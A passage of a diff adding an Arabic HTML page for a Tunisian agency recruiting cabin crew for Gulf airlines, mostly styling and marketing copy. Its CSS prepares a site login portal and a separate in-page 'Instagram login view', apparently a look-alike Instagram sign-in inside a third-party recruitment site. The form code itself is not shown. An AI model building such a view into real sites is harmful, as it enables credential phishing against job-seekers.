@@ -1,0 +1,1607 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>وكالة الحياة الأفضل التونسية — وظائف طاقم المقصورة في الخليج</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=Inter:wght@400;500;600&family=IBM+Plex+Mono:wght@500;600&display=swap"
+    rel="stylesheet" />
+  <style>
+    :root {
+      --ink: #122036;
+      --ink-2: #1b2c4a;
+      --cream: #F6F1E3;
+      --cream-2: #EFE8D4;
+      --gold: #C7972E;
+      --gold-dark: #8F6A1E;
+      --slate: #5B6A7E;
+      --red: #A23528;
+      --line: rgba(18, 32, 54, 0.14);
+      --line-light: rgba(246, 241, 227, 0.22);
+      --instagram: #E4405F;
+      --instagram-hover: #c1354f;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      background: var(--cream);
+      color: var(--ink);
+      font-family: 'Inter', sans-serif;
+      line-height: 1.6;
+    }
+
+    /* direction arabic */
+    body,
+    .nav-inner,
+    .hero-inner,
+    .wrap,
+    .foot-inner,
+    .login-card,
+    .form-card {
+      direction: rtl;
+      text-align: right;
+    }
+
+    h1,
+    h2,
+    h3 {
+      font-family: 'Fraunces', serif;
+      font-weight: 500;
+      margin: 0;
+      letter-spacing: -0.01em;
+    }
+
+    .mono {
+      font-family: 'IBM Plex Mono', monospace;
+      letter-spacing: 0.06em;
+    }
+
+    .eyebrow {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 12px;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--gold-dark);
+      font-weight: 600;
+    }
+
+    a {
+      color: inherit;
+    }
+
+    button {
+      font-family: inherit;
+    }
+
+    /* ---------- NAV ---------- */
+    .nav {
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      background: var(--ink);
+      color: var(--cream);
+      border-bottom: 1px solid var(--line-light);
+    }
+
+    .nav-inner {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 16px 28px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+    }
+
+    .brand-mark {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      border: 1.5px solid var(--gold);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--gold);
+      flex-shrink: 0;
+    }
+
+    .brand-name {
+      font-family: 'Fraunces', serif;
+      font-size: 17px;
+      font-weight: 500;
+      line-height: 1.15;
+    }
+
+    .brand-name small {
+      display: block;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 10px;
+      letter-spacing: 0.14em;
+      color: var(--slate);
+      font-weight: 600;
+      text-transform: uppercase;
+      margin-top: 2px;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 26px;
+      align-items: center;
+    }
+
+    .nav-links a {
+      font-size: 14px;
+      text-decoration: none;
+      color: var(--cream);
+      opacity: 0.82;
+      padding: 6px 2px;
+      border-bottom: 1px solid transparent;
+      cursor: pointer;
+    }
+
+    .nav-links a:hover {
+      opacity: 1;
+      border-bottom-color: var(--gold);
+    }
+
+    .nav-cta {
+      font-size: 13px;
+      font-family: 'IBM Plex Mono', monospace;
+      font-weight: 600;
+      background: transparent;
+      color: var(--gold);
+      border: 1px solid var(--gold);
+      padding: 9px 16px;
+      border-radius: 2px;
+      cursor: pointer;
+      letter-spacing: 0.04em;
+      white-space: nowrap;
+    }
+
+    .nav-cta:hover {
+      background: var(--gold);
+      color: var(--ink);
+    }
+
+    .nav-toggle {
+      display: none;
+      background: none;
+      border: none;
+      color: var(--cream);
+      font-size: 22px;
+      cursor: pointer;
+    }
+
+    /* ---------- HERO / DEPARTURE BOARD ---------- */
+    .hero {
+      background: var(--ink);
+      color: var(--cream);
+      padding: 64px 28px 56px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero-inner {
+      max-width: 1180px;
+      margin: 0 auto;
+    }
+
+    .hero-top {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 48px;
+      align-items: flex-end;
+      margin-bottom: 44px;
+    }
+
+    .hero-copy {
+      flex: 1 1 420px;
+    }
+
+    .hero-copy h1 {
+      font-size: clamp(34px, 5vw, 54px);
+      color: var(--cream);
+      margin: 14px 0 18px;
+      line-height: 1.05;
+    }
+
+    .hero-copy p {
+      color: #C7CFDB;
+      font-size: 16px;
+      max-width: 480px;
+      margin: 0 0 26px;
+    }
+
+    .hero-actions {
+      display: flex;
+      gap: 14px;
+      flex-wrap: wrap;
+    }
+
+    .btn-primary {
+      background: var(--gold);
+      color: var(--ink);
+      border: none;
+      padding: 13px 22px;
+      font-size: 14px;
+      font-weight: 600;
+      border-radius: 2px;
+      cursor: pointer;
+      font-family: 'IBM Plex Mono', monospace;
+      letter-spacing: 0.03em;
+    }
+
+    .btn-primary:hover {
+      background: #DCAE4E;
+    }
+
+    .btn-ghost {
+      background: transparent;
+      color: var(--cream);
+      border: 1px solid var(--line-light);
+      padding: 13px 22px;
+      font-size: 14px;
+      border-radius: 2px;
+      cursor: pointer;
+      font-family: 'IBM Plex Mono', monospace;
+      letter-spacing: 0.03em;
+    }
+
+    .btn-ghost:hover {
+      border-color: var(--cream);
+    }
+
+    /* split flap board */
+    .board {
+      background: #0C1728;
+      border: 1px solid var(--line-light);
+      border-radius: 4px;
+      padding: 18px 20px;
+      flex: 1 1 380px;
+      max-width: 460px;
+    }
+
+    .board-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 10px;
+      margin-bottom: 10px;
+      border-bottom: 1px solid var(--line-light);
+    }
+
+    .board-head span {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 11px;
+      letter-spacing: 0.12em;
+      color: var(--slate);
+      text-transform: uppercase;
+    }
+
+    .board-cols {
+      display: grid;
+      grid-template-columns: 2fr 1fr 1.4fr 1.3fr;
+      gap: 6px;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 10px;
+      color: var(--slate);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      padding-bottom: 8px;
+    }
+
+    .board-row {
+      display: grid;
+      grid-template-columns: 2fr 1fr 1.4fr 1.3fr;
+      gap: 6px;
+      padding: 9px 0;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 13px;
+      align-items: center;
+    }
+
+    .board-row .city {
+      color: var(--cream);
+      font-weight: 600;
+      letter-spacing: 0.03em;
+    }
+
+    .board-row .code {
+      color: var(--slate);
+    }
+
+    .board-row .status {
+      color: var(--gold);
+      font-size: 11px;
+      letter-spacing: 0.08em;
+    }
+
+    .flap {
+      display: inline-block;
+    }
+
+    .hero-strip {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 0;
+      border-top: 1px solid var(--line-light);
+      padding-top: 22px;
+    }
+
+    .hero-strip div {
+      padding: 0 20px;
+      border-left: 1px solid var(--line-light);
+    }
+
+    .hero-strip div:first-child {
+      border-left: none;
+      padding-left: 0;
+    }
+
+    .hero-strip .num {
+      font-family: 'Fraunces', serif;
+      font-size: 26px;
+      color: var(--gold);
+    }
+
+    .hero-strip .lbl {
+      font-size: 12px;
+      color: #9FACC0;
+      margin-top: 4px;
+    }
+
+    /* ---------- SECTIONS ---------- */
+    section {
+      padding: 88px 28px;
+    }
+
+    .wrap {
+      max-width: 1180px;
+      margin: 0 auto;
+    }
+
+    .section-head {
+      max-width: 640px;
+      margin-bottom: 48px;
+    }
+
+    .section-head h2 {
+      font-size: clamp(26px, 3.4vw, 36px);
+      margin-top: 12px;
+    }
+
+    .section-head p {
+      color: var(--slate);
+      font-size: 15.5px;
+      margin-top: 14px;
+    }
+
+    .about {
+      background: var(--cream);
+    }
+
+    .about-grid {
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap: 60px;
+      align-items: start;
+    }
+
+    .about-grid p {
+      color: #374357;
+      font-size: 15.5px;
+      margin: 0 0 16px;
+    }
+
+    .stat-block {
+      background: var(--ink);
+      color: var(--cream);
+      border-radius: 4px;
+      padding: 30px 28px;
+    }
+
+    .stat-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 14px 0;
+      border-bottom: 1px solid var(--line-light);
+    }
+
+    .stat-row:last-child {
+      border-bottom: none;
+    }
+
+    .stat-row .n {
+      font-family: 'Fraunces', serif;
+      font-size: 22px;
+      color: var(--gold);
+    }
+
+    .stat-row .l {
+      font-size: 13px;
+      color: #B7C1D1;
+      max-width: 170px;
+      text-align: right;
+    }
+
+    /* process */
+    .process {
+      background: var(--cream-2);
+    }
+
+    .process-list {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 0;
+      border-top: 1px solid var(--line);
+    }
+
+    .step {
+      padding: 26px 22px;
+      border-right: 1px solid var(--line);
+      position: relative;
+    }
+
+    .step:last-child {
+      border-right: none;
+    }
+
+    .step .idx {
+      font-family: 'IBM Plex Mono', monospace;
+      color: var(--gold-dark);
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .step h3 {
+      font-size: 17px;
+      margin: 10px 0 8px;
+    }
+
+    .step p {
+      font-size: 13.5px;
+      color: var(--slate);
+      margin: 0;
+    }
+
+    /* training - boarding pass cards */
+    .training {
+      background: var(--cream);
+    }
+
+    .pass-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 22px;
+    }
+
+    .pass {
+      background: var(--ink);
+      color: var(--cream);
+      border-radius: 6px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .pass-top {
+      padding: 20px 20px 16px;
+      flex: 1;
+    }
+
+    .pass-top .eyebrow {
+      color: var(--gold);
+    }
+
+    .pass-top h3 {
+      font-size: 18px;
+      margin: 10px 0 8px;
+      color: var(--cream);
+    }
+
+    .pass-top p {
+      font-size: 13.5px;
+      color: #AEB9CB;
+      margin: 0;
+    }
+
+    .perf {
+      position: relative;
+      border-top: 1px dashed rgba(246, 241, 227, 0.35);
+      margin: 0 20px;
+    }
+
+    .perf::before,
+    .perf::after {
+      content: '';
+      position: absolute;
+      top: -8px;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background: var(--cream);
+    }
+
+    .perf::before {
+      left: -28px;
+    }
+
+    .perf::after {
+      right: -28px;
+    }
+
+    .pass-bottom {
+      padding: 14px 20px 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 11px;
+      color: var(--slate);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    .pass-bottom b {
+      color: var(--gold);
+      font-size: 13px;
+      letter-spacing: 0.03em;
+    }
+
+    /* destinations */
+    .destinations {
+      background: var(--ink);
+      color: var(--cream);
+    }
+
+    .destinations .section-head p {
+      color: #AEB9CB;
+    }
+
+    .destinations .eyebrow {
+      color: var(--gold);
+    }
+
+    .dest-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 1px;
+      background: var(--line-light);
+      border: 1px solid var(--line-light);
+    }
+
+    .dest-card {
+      background: var(--ink);
+      padding: 26px 20px;
+    }
+
+    .dest-card .code {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 26px;
+      color: var(--gold);
+    }
+
+    .dest-card h3 {
+      font-size: 17px;
+      color: var(--cream);
+      margin: 10px 0 6px;
+    }
+
+    .dest-card p {
+      font-size: 13px;
+      color: #9FACC0;
+      margin: 0;
+    }
+
+    /* testimonials */
+    .stories {
+      background: var(--cream-2);
+    }
+
+    .stub-row {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 22px;
+    }
+
+    .stub {
+      background: var(--cream);
+      border: 1px solid var(--line);
+      border-radius: 4px;
+      padding: 22px 22px 18px;
+      position: relative;
+    }
+
+    .stub .route {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 12px;
+      color: var(--gold-dark);
+      font-weight: 600;
+      letter-spacing: 0.06em;
+    }
+
+    .stub p.quote {
+      font-size: 14.5px;
+      color: #374357;
+      margin: 14px 0 18px;
+      font-style: italic;
+    }
+
+    .stub .who {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      border-top: 1px solid var(--line);
+      padding-top: 12px;
+    }
+
+    .stub .who b {
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .stub .who span {
+      font-size: 12px;
+      color: var(--slate);
+      font-family: 'IBM Plex Mono', monospace;
+    }
+
+    /* apply / contact */
+    .apply {
+      background: var(--cream);
+    }
+
+    .apply-grid {
+      display: grid;
+      grid-template-columns: 0.9fr 1.1fr;
+      gap: 56px;
+    }
+
+    .form-card {
+      background: var(--ink);
+      color: var(--cream);
+      border-radius: 6px;
+      padding: 30px;
+    }
+
+    .field {
+      margin-bottom: 16px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: #9FACC0;
+      margin-bottom: 6px;
+      font-family: 'IBM Plex Mono', monospace;
+    }
+
+    .field input,
+    .field select,
+    .field textarea {
+      width: 100%;
+      background: #0C1728;
+      border: 1px solid var(--line-light);
+      color: var(--cream);
+      padding: 11px 12px;
+      border-radius: 2px;
+      font-size: 14px;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .field textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    .field input::placeholder,
+    .field textarea::placeholder {
+      color: #5B6A7E;
+    }
+
+    .form-note {
+      font-size: 12px;
+      color: #8291A6;
+      margin-top: 14px;
+    }
+
+    .apply-side p {
+      color: #374357;
+      font-size: 15px;
+      margin: 0 0 14px;
+    }
+
+    .req-list {
+      list-style: none;
+      margin: 22px 0 0;
+      padding: 0;
+    }
+
+    .req-list li {
+      display: flex;
+      gap: 12px;
+      padding: 11px 0;
+      border-bottom: 1px solid var(--line);
+      font-size: 14px;
+      color: #374357;
+    }
+
+    .req-list li .check {
+      color: var(--gold-dark);
+      font-family: 'IBM Plex Mono', monospace;
+      font-weight: 600;
+    }
+
+    /* footer */
+    footer {
+      background: var(--ink);
+      color: #9FACC0;
+      padding: 44px 28px 26px;
+    }
+
+    .foot-inner {
+      max-width: 1180px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 30px;
+      border-bottom: 1px solid var(--line-light);
+      padding-bottom: 28px;
+    }
+
+    .foot-col h4 {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 12px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--cream);
+      margin: 0 0 12px;
+    }
+
+    .foot-col p,
+    .foot-col a {
+      font-size: 13.5px;
+      display: block;
+      text-decoration: none;
+      color: #9FACC0;
+      margin-bottom: 6px;
+    }
+
+    .foot-col a:hover {
+      color: var(--gold);
+    }
+
+    .foot-bottom {
+      max-width: 1180px;
+      margin: 18px auto 0;
+      font-size: 12px;
+      color: #66748A;
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    /* ---------- LOGIN PAGE ---------- */
+    .login-page {
+      min-height: 100vh;
+      background: var(--ink);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .login-card {
+      width: 100%;
+      max-width: 380px;
+      background: #0C1728;
+      border: 1px solid var(--line-light);
+      border-radius: 6px;
+      padding: 34px 32px;
+    }
+
+    .login-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 26px;
+      cursor: pointer;
+    }
+
+    .login-card h2 {
+      color: var(--cream);
+      font-size: 22px;
+      margin-bottom: 6px;
+    }
+
+    .login-card>p {
+      color: #9FACC0;
+      font-size: 13.5px;
+      margin: 0 0 26px;
+    }
+
+    .login-card .field label {
+      color: #9FACC0;
+    }
+
+    .login-card .field input {
+      background: #122036;
+    }
+
+    .login-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 4px 0 22px;
+      font-size: 13px;
+    }
+
+    .login-row a {
+      color: var(--gold);
+      text-decoration: none;
+    }
+
+    .login-row label {
+      color: #9FACC0;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .btn-block {
+      width: 100%;
+    }
+
+    .login-foot {
+      text-align: center;
+      font-size: 13.5px;
+      color: #9FACC0;
+      margin-top: 20px;
+    }
+
+    .login-foot a {
+      color: var(--gold);
+      text-decoration: none;
+    }
+
+    .form-msg {
+      display: none;
+      background: rgba(199, 151, 46, 0.14);
+      border: 1px solid var(--gold);
+      color: var(--gold);
+      font-size: 13px;
+      padding: 10px 12px;
+      border-radius: 2px;
+      margin-top: 14px;
+    }
+
+    .form-msg.error {
+      background: rgba(162, 53, 40, 0.16);
+      border-color: var(--red);
+      color: #d45a4a;
+    }
+
+    .form-msg.success {
+      background: rgba(199, 151, 46, 0.14);
+      border-color: var(--gold);
+      color: var(--gold);
+    }
+
+    /* ---------- INSTAGRAM BUTTON ---------- */
+    .btn-instagram {
+      background: var(--instagram);
+      color: #fff;
+      border: none;
+      padding: 13px 22px;
+      font-size: 14px;
+      font-weight: 600;
+      border-radius: 2px;
+      cursor: pointer;
+      font-family: 'IBM Plex Mono', monospace;
+      letter-spacing: 0.03em;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: background 0.2s;
+    }
+
+    .btn-instagram:hover {
+      background: var(--instagram-hover);
+    }
+
+    .btn-instagram svg {
+      flex-shrink: 0;
+    }
+
+    .login-divider {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 18px 0 22px;
+      color: var(--slate);
+      font-size: 12px;
+      font-family: 'IBM Plex Mono', monospace;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .login-divider::before,
+    .login-divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--line-light);
+    }
+
+    /* ---------- INSTAGRAM LOGIN VIEW ---------- */
+    .insta-back {
+      background: none;
+      border: none;
+      color: var(--slate);
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 13px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0;
+      margin-bottom: 18px;
+      transition: color 0.2s;
+    }
+
+    .insta-back:hover {
+      color: var(--cream);
+    }
+
+    .insta-icon-large {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+
+    .view {
+      display: none;
+    }
+
+    .view.active {
+      display: block;
+    }
+
+    @media (max-width: 900px) {
+      .nav-links {
+        display: none;
+      }
+
+      .nav-toggle {
+        display: block;
+      }
+
+      .about-grid,
+      .apply-grid {
+        grid-template-columns: 1fr;
+        gap: 36px;
+      }
+
+      .process-list,
+      .pass-grid,
+      .dest-grid,
+      .stub-row {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .process-list .step {
+        border-right: 1px solid var(--line);
+      }
+
+      .hero-strip {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 16px 0;
+      }
+    }
+
+    @media (max-width: 560px) {
+
+      .process-list,
+      .pass-grid,
+      .dest-grid,
+      .stub-row {
+        grid-template-columns: 1fr;
+      }
+
+      .board-cols,
+      .board-row {
+        grid-template-columns: 1.6fr 0.8fr 1.2fr 1fr;
+        font-size: 11px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ===================== MAIN SITE VIEW ===================== -->
+  <div id="view-site" class="view active">
+
+    <nav class="nav">
+      <div class="nav-inner">
+        <div class="brand" onclick="goTo('view-site','home')">
+          <div class="brand-mark">TBL</div>
+          <div class="brand-name">الحياة الأفضل التونسية<small>وكالة · تونس</small></div>
+        </div>
+        <div class="nav-links" id="navLinks">
+          <a onclick="goTo('view-site','about')">عن الوكالة</a>
+          <a onclick="goTo('view-site','process')">كيف تعمل</a>
+          <a onclick="goTo('view-site','training')">التدريب</a>
+          <a onclick="goTo('view-site','destinations')">الوجهات</a>
+          <a onclick="goTo('view-site','apply')">تقديم</a>
+        </div>
+        <button class="nav-cta" onclick="showView('view-login')">دخول البوابة</button>
+      </div>
+    </nav>
+
+    <!-- HERO -->
+    <header class="hero" id="home">
+      <div class="hero-inner">
+        <div class="hero-top">
+          <div class="hero-copy">
+            <span class="eyebrow">تونس · الرحلات</span>
+            <h1>مهنة طاقم المقصورة تنطلق من تونس.</h1>
+            <p>نحن نوظف، ندرب، ونؤهل المرشحين التونسيين لوظائف مضيفين جويين في شركات الطيران الخليجية — ثم ندعمهم في
+              التأشيرات، الانتقال، والأشهر الأولى على متن الطائرة.</p>
+            <div class="hero-actions">
+              <button class="btn-primary" onclick="goTo('view-site','apply')">ابدأ طلبك</button>
+              <button class="btn-ghost" onclick="goTo('view-site','process')">اطلع على الخطوات</button>
+            </div>
+          </div>
+          <div class="board">
+            <div class="board-head">
+              <span>توظيف شركات الخليج</span>
+              <span>قبول مباشر</span>
+            </div>
+            <div class="board-cols"><span>الوجهة</span><span>الرحلة</span><span>الناقل</span><span>الحالة</span></div>
+            <div id="boardBody"></div>
+          </div>
+        </div>
+        <div class="hero-strip">
+          <div>
+            <div class="num">6</div>
+            <div class="lbl">أسابيع برنامج تدريبي في تونس</div>
+          </div>
+          <div>
+            <div class="num">4</div>
+            <div class="lbl">مراكز خليجية نوظف فيها</div>
+          </div>
+          <div>
+            <div class="num">1:1</div>
+            <div class="lbl">تدريب مقابلة قبل يوم الشركة</div>
+          </div>
+          <div>
+            <div class="num">90</div>
+            <div class="lbl">يوم متابعة بعد الوصول</div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- ABOUT -->
+    <section class="about" id="about">
+      <div class="wrap">
+        <div class="about-grid">
+          <div>
+            <span class="eyebrow">عن الوكالة</span>
+            <h2 style="margin-top:12px;">جسر تونسي إلى وظائف الطيران الخليجية.</h2>
+            <p>تأسست وكالة الحياة الأفضل التونسية في تونس لمساعدة المرشحين التونسيين في الحصول على وظائف مضيفين جويين في
+              كبرى شركات الطيران الخليجية — وهي وظائف يصعب الوصول إليها دون التحضير المناسب، والعلاقات، والتدريب.</p>
+            <p>نحن لست وكالة سفر ولا نبيع تأشيرات. نحن خدمة توظيف وتدريب: نفحص المرشحين وفق معايير الأهلية الحقيقية
+              للطيران، ونخضعهم لبرنامج تحضيري منظم لطاقم المقصورة، وندعم الأوراق بعد الحصول على العرض.</p>
+            <p>كل مرشح يعمل مع مسؤول حالة معين من مرحلة التقديم حتى أول 90 يومًا في الخليج — فلا أحد يخوض العملية
+              بمفرده.</p>
+          </div>
+          <div class="stat-block">
+            <div class="stat-row"><span class="n">2019</span><span class="l">تأسيس الوكالة في تونس</span></div>
+            <div class="stat-row"><span class="n">4</span><span class="l">أسواق خليجية: الإمارات، قطر، السعودية،
+                البحرين</span></div>
+            <div class="stat-row"><span class="n">6 أسابيع</span><span class="l">متوسط مدة البرنامج التدريبي</span>
+            </div>
+            <div class="stat-row"><span class="n">مرخصة</span><span class="l">وكالة توظيف خاصة مسجلة في تونس</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PROCESS -->
+    <section class="process" id="process">
+      <div class="wrap">
+        <div class="section-head">
+          <span class="eyebrow">كيف تعمل</span>
+          <h2>أربع مراحل، مسؤول حالة واحد، من البداية إلى النهاية.</h2>
+          <p>مسار التقديم إلى أول رحلة يتبع نفس التسلسل لكل مرشح — لا يتم تخطي أي خطوة، ولا يتم التسرع في أي منها.</p>
+        </div>
+        <div class="process-list">
+          <div class="step">
+            <span class="idx">01</span>
+            <h3>تقديم وفحص</h3>
+            <p>قدّم طلبك. نتحقق من الأهلية: العمر، الطول والوصول، مستوى اللغة، واللياقة العامة وفق معايير شركات الخليج.
+            </p>
+          </div>
+          <div class="step">
+            <span class="idx">02</span>
+            <h3>التدريب</h3>
+            <p>برنامج مدته ستة أسابيع في تونس يغطي إجراءات السلامة، معايير المظهر، التدريب الخدمي، واللغة الإنجليزية
+              والعربية لطاقم المقصورة.</p>
+          </div>
+          <div class="step">
+            <span class="idx">03</span>
+            <h3>التأهيل والمقابلة</h3>
+            <p>أيام محاكاة لتقييمات شركات الطيران، بالإضافة إلى تدريب فردي على المقابلات قبل دخول المقابلة الحقيقية.</p>
+          </div>
+          <div class="step">
+            <span class="idx">04</span>
+            <h3>الانتقال والطيران</h3>
+            <p>بمجرد حصولك على عرض، ندعم أوراق التأشيرة، والتوجيه السكني، ونتابع معك بانتظام خلال أول 90 يومًا.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- TRAINING -->
+    <section class="training" id="training">
+      <div class="wrap">
+        <div class="section-head">
+          <span class="eyebrow">برنامج التدريب</span>
+          <h2>ما تغطيه الأسابيع الستة في تونس فعليًا.</h2>
+          <p>كل وحدة مبنية على ما تختبره أيام التقييم في شركات الخليج — بحيث يكون وقت التدريب موجهاً لما يهم فعلاً في
+            يوم التقييم.</p>
+        </div>
+        <div class="pass-grid">
+          <div class="pass">
+            <div class="pass-top">
+              <span class="eyebrow">الوحدة 01</span>
+              <h3>إجراءات السلامة والطوارئ</h3>
+              <p>تمارين الإخلاء، التعامل مع معدات الطوارئ، والاستجابة الأولية — جوهر أي شهادة طاقم مقصورة.</p>
+            </div>
+            <div class="perf"></div>
+            <div class="pass-bottom"><span>المدة</span><b>10 أيام</b></div>
+          </div>
+          <div class="pass">
+            <div class="pass-top">
+              <span class="eyebrow">الوحدة 02</span>
+              <h3>المظهر والتحضير</h3>
+              <p>معايير الزي الرسمي، الوضعية، ومعايير التقديم التي تقيمها شركات الخليج في أيام التقديم.</p>
+            </div>
+            <div class="perf"></div>
+            <div class="pass-bottom"><span>المدة</span><b>4 أيام</b></div>
+          </div>
+          <div class="pass">
+            <div class="pass-top">
+              <span class="eyebrow">الوحدة 03</span>
+              <h3>الخدمة والضيافة</h3>
+              <p>تسلسلات الخدمة أثناء الرحلة، التعامل مع الركاب الصعبين، ومعايير الضيافة المستخدمة في مقصورات الخليج.
+              </p>
+            </div>
+            <div class="perf"></div>
+            <div class="pass-bottom"><span>المدة</span><b>8 أيام</b></div>
+          </div>
+          <div class="pass">
+            <div class="pass-top">
+              <span class="eyebrow">الوحدة 04</span>
+              <h3>الإنجليزية والعربية لطاقم المقصورة</h3>
+              <p>مفردات الطيران، إعلانات الركاب، وإنجليزية المقابلات — بالإضافة إلى أساسيات العربية الخليجية للمحادثة.
+              </p>
+            </div>
+            <div class="perf"></div>
+            <div class="pass-bottom"><span>المدة</span><b>مستمر</b></div>
+          </div>
+          <div class="pass">
+            <div class="pass-top">
+              <span class="eyebrow">الوحدة 05</span>
+              <h3>تقييم السباحة واللياقة</h3>
+              <p>التحضير لتقييم السباحة في المسبح وتدريبات اللياقة العامة لتلبية المتطلبات البدنية للشركات.</p>
+            </div>
+            <div class="perf"></div>
+            <div class="pass-bottom"><span>المدة</span><b>6 أيام</b></div>
+          </div>
+          <div class="pass">
+            <div class="pass-top">
+              <span class="eyebrow">الوحدة 06</span>
+              <h3>أيام المحاكاة التقييمية</h3>
+              <p>تكامل كامل لأيام التقييم الحقيقية: تمارين جماعية، مقابلات فردية، وجلسات مراجعة نهائية.</p>
+            </div>
+            <div class="perf"></div>
+            <div class="pass-bottom"><span>المدة</span><b>3 أيام</b></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- DESTINATIONS -->
+    <section class="destinations" id="destinations">
+      <div class="wrap">
+        <div class="section-head">
+          <span class="eyebrow">الوجهات</span>
+          <h2>أين يطير مرشحونا.</h2>
+          <p>نوظف مرشحينا في كبرى شركات الطيران الخليجية عبر أربعة مراكز. تختلف الفرص حسب الموسم ودورات التوظيف.</p>
+        </div>
+        <div class="dest-grid">
+          <div class="dest-card">
+            <div class="code">DXB</div>
+            <h3>دبي، الإمارات</h3>
+            <p>توظيف طاقم مقصورة طيران الإمارات — أكبر مسار توظيف لدينا.</p>
+          </div>
+          <div class="dest-card">
+            <div class="code">DOH</div>
+            <h3>الدوحة، قطر</h3>
+            <p>أيام التوظيف المفتوحة للخطوط الجوية القطرية، تُعقد عدة مرات في السنة في تونس والدوحة.</p>
+          </div>
+          <div class="dest-card">
+            <div class="code">RUH</div>
+            <h3>الرياض وجدة، السعودية</h3>
+            <p>توظيف الخطوط السعودية وفلاي ناس، في نمو سريع مع توسع الطيران السعودي.</p>
+          </div>
+          <div class="dest-card">
+            <div class="code">AUH</div>
+            <h3>أبوظبي، الإمارات</h3>
+            <p>توظيف طاقم مقصورة الاتحاد للطيران، عادة مرتين في السنة.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- STORIES -->
+    <section class="stories" id="stories">
+      <div class="wrap">
+        <div class="section-head">
+          <span class="eyebrow">قصص المرشحين</span>
+          <h2>بعض من غادروا تونس إلى الخليج.</h2>
+        </div>
+        <div class="stub-row">
+          <div class="stub">
+            <span class="route">تونس → الدوحة</span>
+            <p class="quote">"أيام المحاكاة كانت أصعب من الأيام الحقيقية — مما جعل اليوم الحقيقي أكثر سهولة."</p>
+            <div class="who"><b>أميرة ب.</b><span>الخطوط القطرية</span></div>
+          </div>
+          <div class="stub">
+            <span class="route">تونس → دبي</span>
+            <p class="quote">"اتصل بي مسؤول الحالة في الأسبوع الأول من وصولي إلى دبي، فقط للاطمئنان على ترتيبات السكن."
+            </p>
